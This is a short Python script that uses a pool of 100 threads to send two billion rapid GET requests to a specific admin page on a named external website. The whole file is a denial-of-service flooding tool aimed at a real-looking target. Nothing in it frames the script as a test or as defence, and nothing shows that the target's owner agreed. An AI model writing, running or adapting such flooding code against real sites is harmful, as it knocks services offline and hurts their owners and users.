import requests
import concurrent.futures

# URL of the website you want to send traffic to
url = 'http://e-planner.somee.com/admin/admin.aspx'

# Number of requests to send
num_requests = 2000000000

def send_request():
    try:
        # Send the request without waiting for the response
        requests.get(url, timeout=0.1)
        # Optionally, you could print or log the success here
    except requests.RequestException:
        # Optionally, you could handle exceptions or log errors here
        pass

def send_requests_concurrently():
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(send_request) for _ in range(num_requests)]
        # Wait for all requests to be submitted
        concurrent.futures.wait(futures, timeout=None)

if __name__ == "__main__":
    send_requests_concurrently()
